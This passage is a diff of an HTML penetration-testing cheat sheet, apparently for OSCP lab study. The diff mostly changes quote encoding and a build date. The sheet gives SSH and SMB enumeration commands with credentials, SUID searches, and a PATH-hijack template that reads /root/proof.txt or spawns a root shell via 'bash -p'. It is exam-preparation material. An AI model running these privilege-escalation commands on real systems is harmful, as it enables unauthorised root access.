+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
 <span class="c1">## run a whole enumeration script in one connection</span>
-ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <hr />
 <h3>SMB</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'get file.txt'</span>
 </pre></div>
 <hr />
 <h3>Linux local enumeration</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
 
 <span class="c1">## SUID without tripling the output on snap</span>
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
 
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span><span class="w">    </span><span class="c1"># setgid</span>
 getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
 ss<span class="w"> </span>-tlnp
@@ -2114,10 +2114,10 @@ find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </spa
 </pre></div>
 <hr />
 <h3>Binary analysis</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># "not stripped" = function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
 objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
 </pre></div>
 <p>Reconstructing source from a small binary:</p>
@@ -2127,37 +2127,37 @@ objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </sp
 <hr />
 <h3>Privesc — PATH hijack template</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
 <span class="s">#!/bin/bash</span>
 <span class="s">id &gt; /tmp/root_id.txt</span>
 <span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
 <span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
 <span class="s">EOF</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
 
 <span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 
 cat<span class="w"> </span>/tmp/root_id.txt
 </pre></div>
 <p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
 not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
 <p>Interactive variant:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\n/bin/bash -p\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 </pre></div>
 <hr />
 <h3>Cleanup</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
-<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
-ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">"No such file or directory"</span>
 </pre></div></div></section>
 
     <footer>
       <span>Authorised lab environment · flags and credentials are lab-specific</span>
-      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 23 November 2026</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 24 November 2026</span>
     </footer>
   </main>
 </div>
